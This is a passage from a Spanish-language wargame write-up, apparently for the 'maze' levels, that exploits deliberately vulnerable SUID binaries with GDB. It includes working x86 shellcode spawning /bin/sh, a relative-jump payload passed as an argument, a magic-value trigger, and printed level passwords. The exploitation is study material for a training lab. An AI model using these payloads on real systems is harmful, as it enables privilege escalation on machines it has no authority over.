</code></pre></div><p>Esta es la forma de compilar una librería compartida:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze1@maze</span>:<span class=code-blue>/tmp</span>$ gcc -m32 -shared -fpic lib.c -o libc.so.4  
</code></pre></div><p>Ahora ejecutamos el binario desde el directorio actual y obtenemos una consola de comandos y la contraseña del siguiente usuario:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze1@maze</span>:<span class=code-blue>/tmp</span>$ /maze/maze1  
$ whoami
maze2
$ cat /etc/maze_pass/maze2
fooghihahr
</code></pre></div><h2 id=nivel-2---3>Nivel 2 -> 3</h2><p>La función <code>main</code> del código fuente descompilado de <code>/maze/maze2</code> es bastante interesante:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>code</span><span class=mtk1>[</span><span class=mtk6>8</span><span class=mtk1>];</span>
  <span class=mtk1>anon_subr_void_varargs</span> <span class=mtk5>*</span><span class=mtk1>fp;</span>

  <span class=mtk5>if</span> <span class=mtk1>(argc</span> <span class=mtk5>!=</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>  
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk8>strncpy</span><span class=mtk1>(code,</span> <span class=mtk1>argv[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class=mtk6>8</span><span class=mtk1>);</span>
  <span class=mtk1>(</span><span class=mtk5>*</span><span class=mtk1>(code</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>code)();</span>
  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>Básicamente, está tomando 8 bytes de un argumento y ejecutando dichos bytes.</p><p>Recordemos que este laboratorio tiene todas las protecciones deshabilitadas (NX, PIE, canarios e incluso ASLR). Por tanto, tenemos que encontrar una manera de ejecutar código malicioso.</p><p>Pero 8 bytes no son suficientes para poner <em>shellcode</em> válido. Sin embargo, podemos utilizar variables de entorno.</p><p>La pila (<em>stack</em>) se llenará con todas las variables de entorno de la sesión de consola actual. Por tanto, podemos utilizar una instrucción de salto en los 8 bytes que debemos poner como argumento y saltar a la pila en la posición de cierta variable de entorno.</p><p>Vamos a probarlo con GDB en el servidor:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ export AAAA=BBBBBBBB
<span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze2
Reading symbols from /maze/maze2...done.
(gdb) break main
Breakpoint 1 at 0x8048421: file maze2.c, line 22.
(gdb) run CCCCCCCC
Starting program: /maze/maze2 CCCCCCCC

Breakpoint 1, main (argc=2, argv=0xffffd764) at maze2.c:22  
22      maze2.c: No such file or directory.
</code></pre></div><p>Perfecto, veamos en qué posición se encuentra la variable <code>AAAA=BBBBBBBB</code> en la pila:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) info proc mapping
process 20960
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /maze/maze2
         0x8049000  0x804a000     0x1000        0x0 /maze/maze2
        0xf7e10000 0xf7e12000     0x2000        0x0
        0xf7e12000 0xf7fc3000   0x1b1000        0x0 /lib32/libc-2.24.so  
        0xf7fc3000 0xf7fc5000     0x2000   0x1b0000 /lib32/libc-2.24.so
        0xf7fc5000 0xf7fc6000     0x1000   0x1b2000 /lib32/libc-2.24.so
        0xf7fc6000 0xf7fc9000     0x3000        0x0
        0xf7fd2000 0xf7fd4000     0x2000        0x0
        0xf7fd4000 0xf7fd7000     0x3000        0x0 [vvar]
        0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
        0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib32/ld-2.24.so
        0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib32/ld-2.24.so
        0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib32/ld-2.24.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xfffdd000, 0xffffe000 - 1, "AAAA=BBBBBBBB"
0xffffdf27
1 pattern found.
(gdb) x/s 0xffffdf27
0xffffdf27:     "AAAA=BBBBBBBB"
</code></pre></div><p>Y ahí la tenemos. Ahora, identificamos la dirección de la instrucción que ejecuta los 8 bytes (<code>0x0804844e</code>) y ponemos un <em>breakpoint</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) disassemble main
Dump of assembler code for function main:
   0x0804841b &lt;+0&gt;:     push   %ebp
   0x0804841c &lt;+1&gt;:     mov    %esp,%ebp
   0x0804841e &lt;+3&gt;:     sub    $0xc,%esp
=&gt; 0x08048421 &lt;+6&gt;:     lea    -0xc(%ebp),%eax
   0x08048424 &lt;+9&gt;:     mov    %eax,-0x4(%ebp)
   0x08048427 &lt;+12&gt;:    cmpl   $0x2,0x8(%ebp)
   0x0804842b &lt;+16&gt;:    je     0x8048434 &lt;main+25&gt;
   0x0804842d &lt;+18&gt;:    push   $0x1
   0x0804842f &lt;+20&gt;:    call   0x80482e0 &lt;exit@plt&gt;
   0x08048434 &lt;+25&gt;:    mov    0xc(%ebp),%eax
   0x08048437 &lt;+28&gt;:    add    $0x4,%eax
   0x0804843a &lt;+31&gt;:    mov    (%eax),%eax
   0x0804843c &lt;+33&gt;:    push   $0x8
   0x0804843e &lt;+35&gt;:    push   %eax
   0x0804843f &lt;+36&gt;:    lea    -0xc(%ebp),%eax
   0x08048442 &lt;+39&gt;:    push   %eax
   0x08048443 &lt;+40&gt;:    call   0x8048300 &lt;strncpy@plt&gt;
   0x08048448 &lt;+45&gt;:    add    $0xc,%esp
   0x0804844b &lt;+48&gt;:    mov    -0x4(%ebp),%eax
   0x0804844e &lt;+51&gt;:    call   *%eax
   0x08048450 &lt;+53&gt;:    mov    $0x0,%eax
   0x08048455 &lt;+58&gt;:    leave
   0x08048456 &lt;+59&gt;:    ret
End of assembler dump.
(gdb) break *0x0804844e
Breakpoint 2 at 0x804844e: file maze2.c, line 26.
(gdb) continue
Continuing.

Breakpoint 2, 0x0804844e in main (argc=2, argv=0xffffd764) at maze2.c:26  
26      in maze2.c
</code></pre></div><p>En este punto, podemos ver qué dirección contiene <code>$eax</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) p/x $eax
$1 = 0xffffd6bc  
</code></pre></div><p>Por tanto, podemos utilizar una instrucción de salto a otra dirección utilizando un <em>offset</em> relativo a la dirección actual. Este es el <em>offset</em> que necesitamos (nótese que el número 5 viene de la longitud de <code>AAAA=</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) p/x 0xffffdf27 + 5 - 0xffffd6bc  
$2 = 0x870
</code></pre></div><p>La instrucción de ensamblador que utilizaremos y su código máquina correspondiente es:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ pwn asm 'jmp $+0x870' -f string  
'\xe9k\x08\x00\x00'
</code></pre></div><p>Para verificar que funciona, podemos poner varios <code>\xcc</code> (instrucción de <em>breakpoint</em>, SIGTRAP) en la variable de entorno. Y vemos que la ejecución se detiene, por lo que funciona bien:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ export AAAA=$(python -c 'print "\xcc" * 20')
<span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze2
Reading symbols from /maze/maze2...done.
(gdb) run $(pwn asm 'jmp $+0x870' -f raw)
Starting program: /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw)
/bin/bash: warning: command substitution: ignored null byte in input  

Program received signal SIGTRAP, Trace/breakpoint trap.
0xffffdf2d in ?? ()
</code></pre></div><p>Ahora cogemos un <em>shellcode</em> de Linux x86 como este: <a href=https://www.exploit-db.com/exploits/42428>https://www.exploit-db.com/exploits/42428</a> y lo asignamos a la variable de entorno, añadiendo instrucciones <code>nop</code> al principio por si la pila se modifica o el salto no se produce exactamente al principio del <em>shellcode</em>.</p><p>En GDB funciona, pero no utiliza los permisos SUID:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze2
Reading symbols from /maze/maze2...done.
(gdb) run $(pwn asm 'jmp $+0x870' -f raw)
Starting program: /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw)
/bin/bash: warning: command substitution: ignored null byte in input  
process 24019 is executing new program: /bin/dash
$ whoami
maze2
</code></pre></div><p>Fuera de GDB no funciona:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ export AAAA=$(python -c 'print "\x90" * 20 + "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')  
<span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw)
-bash: warning: command substitution: ignored null byte in input
Segmentation fault
</code></pre></div><p>Esto ocurre porque GDB añade más datos a la pila, por lo que necesitamos reducir el <em>offset</em> de la instrucción de salto hasta que consigamos una <em>shell</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ /maze/maze2 $(pwn asm 'jmp $+0x870' -f raw)
-bash: warning: command substitution: ignored null byte in input  
Segmentation fault
<span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ /maze/maze2 $(pwn asm 'jmp $+0x860' -f raw)
-bash: warning: command substitution: ignored null byte in input
Segmentation fault
<span class=code-green>maze2@maze</span>:<span class=code-blue>~</span>$ /maze/maze2 $(pwn asm 'jmp $+0x850' -f raw)
-bash: warning: command substitution: ignored null byte in input
$ whoami
maze3
$ cat /etc/maze_pass/maze3
beinguthok
</code></pre></div><h2 id=nivel-3---4>Nivel 3 -> 4</h2><p>En este nivel, encontramos un binario que se comporta de manera diferente si ponemos un argumento o no:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze3@maze</span>:<span class=code-blue>~</span>$ /maze/maze3 asdf  
<span class=code-green>maze3@maze</span>:<span class=code-blue>~</span>$ /maze/maze3
./level4 ev0lcmds!
</code></pre></div><p>Mediante <code>strace</code> vemos que si no hay argumentos, el programa termina. Y si añadimos un argumento, sucede algo más:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze3@maze</span>:<span class=code-blue>~</span>$ strace /maze/maze3
execve("/maze/maze3", ["/maze/maze3"], [/* 17 vars */]) = 0
strace: [ Process PID=30847 runs in 32 bit mode. ]
write(1, "./level4 ev0lcmds!\n\0", 20./level4 ev0lcmds!
)  = 20
exit(1)                                 = ?
+++ exited with 1 +++
<span class=code-green>maze3@maze</span>:<span class=code-blue>~</span>$ strace /maze/maze3 asdf
execve("/maze/maze3", ["/maze/maze3", "asdf"], [/* 17 vars */]) = 0  
strace: [ Process PID=30844 runs in 32 bit mode. ]
mprotect(0x8048000, 151, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
exit(1)                                 = ?
+++ exited with 1 +++
</code></pre></div><p>Curiosamente, el programa utiliza <code>mprotect</code> para cambiar los permisos de las direcciones del binario a <code>rwx</code> (lectura, escritura y ejecución).</p><p>Veamos qué tenemos con GDB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze3@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze3
Reading symbols from /maze/maze3...(no debugging symbols found)...done.  
(gdb) set pagination off
(gdb) disassemble _start
Dump of assembler code for function _start:
   0x08048060 &lt;+0&gt;:     pop    %eax
   0x08048061 &lt;+1&gt;:     dec    %eax
   0x08048062 &lt;+2&gt;:     jne    0x8048096 &lt;fine&gt;
   0x08048064 &lt;+4&gt;:     call   0x804807d &lt;_start+29&gt;
   0x08048069 &lt;+9&gt;:     cs das
   0x0804806b &lt;+11&gt;:    insb   (%dx),%es:(%edi)
   0x0804806c &lt;+12&gt;:    gs jbe 0x80480d4 &lt;d1+9&gt;
   0x0804806f &lt;+15&gt;:    insb   (%dx),%es:(%edi)
   0x08048070 &lt;+16&gt;:    xor    $0x20,%al
   0x08048072 &lt;+18&gt;:    gs jbe 0x80480a5 &lt;fine+15&gt;
   0x08048075 &lt;+21&gt;:    insb   (%dx),%es:(%edi)
   0x08048076 &lt;+22&gt;:    arpl   %bp,0x64(%ebp)
   0x08048079 &lt;+25&gt;:    jae    0x804809c &lt;fine+6&gt;
   0x0804807b &lt;+27&gt;:    or     (%eax),%al
   0x0804807d &lt;+29&gt;:    mov    $0x4,%eax
   0x08048082 &lt;+34&gt;:    mov    $0x1,%ebx
   0x08048087 &lt;+39&gt;:    pop    %ecx
   0x08048088 &lt;+40&gt;:    mov    $0x14,%edx
   0x0804808d &lt;+45&gt;:    int    $0x80
   0x0804808f &lt;+47&gt;:    mov    $0x1,%eax
   0x08048094 &lt;+52&gt;:    int    $0x80
End of assembler dump.
</code></pre></div><p>Desde la función <code>_start</code>, solamente nos ocupamos de la llamada a <code>fine</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) disassemble fine
Dump of assembler code for function fine:
   0x08048096 &lt;+0&gt;:     pop    %eax
   0x08048097 &lt;+1&gt;:     mov    $0x7d,%eax
   0x0804809c &lt;+6&gt;:     mov    $0x8048060,%ebx
   0x080480a1 &lt;+11&gt;:    and    $0xfffff000,%ebx  
   0x080480a7 &lt;+17&gt;:    mov    $0x97,%ecx
   0x080480ac &lt;+22&gt;:    mov    $0x7,%edx
   0x080480b1 &lt;+27&gt;:    int    $0x80
   0x080480b3 &lt;+29&gt;:    lea    0x80480cb,%esi
   0x080480b9 &lt;+35&gt;:    mov    %esi,%edi
   0x080480bb &lt;+37&gt;:    mov    $0x2c,%ecx
   0x080480c0 &lt;+42&gt;:    mov    $0x12345678,%edx
End of assembler dump.
</code></pre></div><p>Ahora ponemos un <em>breakpoint</em> en la última instrucción y ejecutamos el código con un argumento cualquiera:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) break *0x080480c0
Breakpoint 1 at 0x80480c0
(gdb) run asdf
Starting program: /maze/maze3 asdf

Breakpoint 1, 0x080480c0 in fine ()  
</code></pre></div><p>Continuamos una instrucción y desensamblamos el bloque actual para ver qué está haciendo el programa:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) stepi
0x080480c5 in l1 ()
(gdb) disassemble
Dump of assembler code for function l1:
=&gt; 0x080480c5 &lt;+0&gt;:    lods   %ds:(%esi),%eax
   0x080480c6 &lt;+1&gt;:    xor    %edx,%eax
   0x080480c8 &lt;+3&gt;:    stos   %eax,%es:(%edi)
   0x080480c9 &lt;+4&gt;:    loop   0x80480c5 &lt;l1&gt;  
End of assembler dump.
</code></pre></div><p>Está realizando una serie de operaciones en bucle (44 veces, que viene de un contador guardado como <code>$ecx = 0x2c</code>). Podemos añadir un breakpoint al final del bucle y utilizar <code>continue 0x2a</code> para detenernos cuando <code>$ecx = 1</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) break *0x080480c9
Breakpoint 2 at 0x80480c9
(gdb) continue
Continuing.

Breakpoint 2, 0x080480c9 in l1 ()
(gdb) p/x $ecx
$2 = 0x2c
(gdb) continue
Continuing.

Breakpoint 2, 0x080480c9 in l1 ()
(gdb) p/x $ecx
$3 = 0x2b
(gdb) continue 0x2a
Will ignore next 41 crossings of breakpoint 2.  Continuing.  

Breakpoint 2, 0x080480c9 in l1 ()
(gdb) p/x $ecx
$4 = 0x1
</code></pre></div><p>Ahora si saltamos una instrucción, salimos del bucle. Y desensamblamos otro bloque:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) stepi
0x080480cb in d1 ()
(gdb) disassemble
Dump of assembler code for function d1:
=&gt; 0x080480cb &lt;+0&gt;:     pop    %eax
   0x080480cc &lt;+1&gt;:     cmpl   $0x1337c0de,(%eax)
   0x080480d2 &lt;+7&gt;:     jne    0x80480ed &lt;d1+34&gt;  
   0x080480d4 &lt;+9&gt;:     xor    %eax,%eax
   0x080480d6 &lt;+11&gt;:    push   %eax
   0x080480d7 &lt;+12&gt;:    push   $0x68732f2f
   0x080480dc &lt;+17&gt;:    push   $0x6e69622f
   0x080480e1 &lt;+22&gt;:    mov    %esp,%ebx
   0x080480e3 &lt;+24&gt;:    push   %eax
   0x080480e4 &lt;+25&gt;:    push   %ebx
   0x080480e5 &lt;+26&gt;:    mov    %esp,%ecx
   0x080480e7 &lt;+28&gt;:    xor    %edx,%edx
   0x080480e9 &lt;+30&gt;:    mov    $0xb,%al
   0x080480eb &lt;+32&gt;:    int    $0x80
   0x080480ed &lt;+34&gt;:    mov    $0x1,%eax
   0x080480f2 &lt;+39&gt;:    xor    %ebx,%ebx
   0x080480f4 &lt;+41&gt;:    inc    %ebx
   0x080480f5 &lt;+42&gt;:    int    $0x80
End of assembler dump.
</code></pre></div><p>Este código puede parecer familiar al <em>shellcode</em> del nivel anterior (realmente, es muy parecido a este: <a href=https://www.exploit-db.com/exploits/43716)>https://www.exploit-db.com/exploits/43716)</a>. De hecho, las operaciones que son ejecutadas en el bucle están diseñadas para modificar las instrucciones del binario y añadir el <em>shellcode</em>.</p><p>Sin embargo, hay una comparación previa. Para ejecutar el <em>shellcode</em> el contenido de la dirección guardada en <code>$eax</code> tiene que ser igual a <code>0x1337c0de</code>. Podemos ver su valor actual:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(gdb) si
0x080480cc in d1 ()
(gdb) p/x $eax
$5 = 0xffffd8b8
(gdb) x/s 0xffffd8b8
0xffffd8b8:     "asdf"  
</code></pre></div><p>Este es el argumento que le hemos pasado al programa.</p><p>Por tanto, si ponemos <code>0x1337c0de</code> en bytes como argumento, tendremos una consola de comandos como <code>maze4</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze3@maze</span>:<span class=code-blue>~</span>$ /maze/maze3 $(echo -e "\xde\xc0\x37\x13")  
$ whoami
maze4
$ cat /etc/maze_pass/maze4
deekaihiek
</code></pre></div><h2 id=nivel-4---5>Nivel 4 -> 5</h2><p>Esta vez tenemos un binario que comprueba el contenido de un archivo provisto antes de ejecutarlo:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>__fd;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar1;</span>
  <span class=mtk1>stat</span> <span class=mtk1>st;</span>
  <span class=mtk1>Elf32_Phdr</span> <span class=mtk1>phdr;</span>
  <span class=mtk1>Elf32_Ehdr</span> <span class=mtk1>ehdr;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>fd;</span>

  <span class=mtk5>if</span> <span class=mtk1>(argc</span> <span class=mtk5>!=</span> <span class=mtk6>2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"usage:</span> <span class=mtk6>%s</span> <span class=mtk4>file2check</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>*</span><span class=mtk1>argv);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk1>__fd</span> <span class=mtk5>=</span> <span class=mtk8>open</span><span class=mtk1>(argv[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(__fd</span> <span class=mtk5>&lt;</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>perror</span><span class=mtk1>(</span><span class=mtk4>"open"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>stat</span><span class=mtk1>(argv[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class=mtk1>(stat</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span><span class=mtk1>st);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>&lt;</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>perror</span><span class=mtk1>(</span><span class=mtk4>"stat"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk8>read</span><span class=mtk1>(__fd,</span> <span class=mtk5>&amp;</span><span class=mtk1>ehdr,</span> <span class=mtk5>0x</span><span class=mtk6>34</span><span class=mtk1>);</span>
  <span class=mtk8>lseek</span><span class=mtk1>(__fd,</span> <span class=mtk1>ehdr.e_phoff,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk8>read</span><span class=mtk1>(__fd,</span> <span class=mtk5>&amp;</span><span class=mtk1>phdr,</span> <span class=mtk5>0x</span><span class=mtk6>20</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(phdr.p_paddr</span> <span class=mtk5>==</span> <span class=mtk1>(</span><span class="mtk7 mtki">uint</span><span class=mtk1>)</span> <span class=mtk1>ehdr.e_ident[</span><span class=mtk6>8</span><span class=mtk1>]</span> <span class=mtk5>*</span> <span class=mtk1>(</span><span class="mtk7 mtki">uint</span><span class=mtk1>)</span> <span class=mtk1>ehdr.e_ident[</span><span class=mtk6>7</span><span class=mtk1>]</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>st.st_size</span> <span class=mtk5>&lt;</span> <span class=mtk5>0x</span><span class=mtk6>78</span><span class=mtk1>)</span> <span class=mtk1>{</span>  
    <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"valid</span> <span class=mtk4>file,</span> <span class=mtk4>executing"</span><span class=mtk1>);</span>
    <span class=mtk8>execv</span><span class=mtk1>(argv[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk8>fwrite</span><span class=mtk1>(</span><span class=mtk4>"file</span> <span class=mtk4>not</span> <span class=mtk4>executed</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>12</span><span class=mtk1>,</span> <span class=mtk1>stderr);</span>
  <span class=mtk8>close</span><span class=mtk1>(__fd);</span>
  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>Vamos a crear un archivo sencillo en <code>/tmp</code> y vemos si lo ejecuta:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ python3 -c 'print("".join(chr(c) * 4 for c in range(0x41, 0x5b)))'
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ  
<span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ python3 -c 'print("".join(chr(c) * 4 for c in range(0x41, 0x5b)))' &lt; /tmp/file
<span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ /maze/maze4 /tmp/file
file not executed
</code></pre></div><p>No, veamos qué hace el programa con GDB. Primero, ponemos un <em>breakpoint</em> antes de <code>lseek</code>;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze4@maze</span>:<span class=code-blue>~</span>$ gdb -q /maze/maze4
Reading symbols from /maze/maze4...done.
(gdb) set pagination off
(gdb) disassemble main
Dump of assembler code for function main:
   0x080485fb &lt;+0&gt;:     push   %ebp
   0x080485fc &lt;+1&gt;:     mov    %esp,%ebp
   0x080485fe &lt;+3&gt;:     sub    $0xb0,%esp
   0x08048604 &lt;+9&gt;:     cmpl   $0x2,0x8(%ebp)
   ...
   0x0804868d &lt;+146&gt;:   call   0x8048430 &lt;read@plt&gt;
   0x08048692 &lt;+151&gt;:   add    $0xc,%esp
   0x08048695 &lt;+154&gt;:   mov    -0x1c(%ebp),%eax
   0x08048698 &lt;+157&gt;:   push   $0x0
   0x0804869a &lt;+159&gt;:   push   %eax
   0x0804869b &lt;+160&gt;:   pushl  -0x4(%ebp)
   0x0804869e &lt;+163&gt;:   call   0x8048450 &lt;lseek@plt&gt;
   0x080486a3 &lt;+168&gt;:   add    $0xc,%esp
   0x080486a6 &lt;+171&gt;:   push   $0x20
   0x080486a8 &lt;+173&gt;:   lea    -0x58(%ebp),%eax
   0x080486ab &lt;+176&gt;:   push   %eax
   0x080486ac &lt;+177&gt;:   pushl  -0x4(%ebp)
   0x080486af &lt;+180&gt;:   call   0x8048430 &lt;read@plt&gt;
   0x080486b4 &lt;+185&gt;:   add    $0xc,%esp
   0x080486b7 &lt;+188&gt;:   mov    -0x4c(%ebp),%eax
   0x080486ba &lt;+191&gt;:   movzbl -0x31(%ebp),%edx
   0x080486be &lt;+195&gt;:   movzbl %dl,%ecx
   0x080486c1 &lt;+198&gt;:   movzbl -0x30(%ebp),%edx
